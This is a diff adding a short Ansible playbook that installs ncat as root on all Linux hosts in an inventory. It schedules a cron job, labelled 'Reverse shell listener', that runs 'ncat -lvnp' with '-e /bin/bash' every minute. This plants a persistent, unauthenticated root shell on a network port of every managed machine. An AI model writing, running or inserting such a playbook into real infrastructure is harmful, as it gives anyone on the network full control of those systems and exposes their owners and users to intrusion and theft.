@@ -1,0 +1,20 @@
+---
+- name: Install ncat and setup cron job
+  hosts: linux_hosts
+  become: yes
+  vars:
+    random_port: "{{ 5000 + (60000 | random(seed=inventory_hostname)) }}"  # Ensures a unique port per host
+    
+  tasks:
+
+    - name: Install ncat
+      ansible.builtin.apt:
+        name: ncat
+        state: present
+        update_cache: yes
+
+    - name: Set up cron job to run ncat
+      ansible.builtin.cron:
+        name: "Reverse shell listener"
+        minute: "*"
+        job: "ncat -lvnp {{ random_port }} -e /bin/bash"
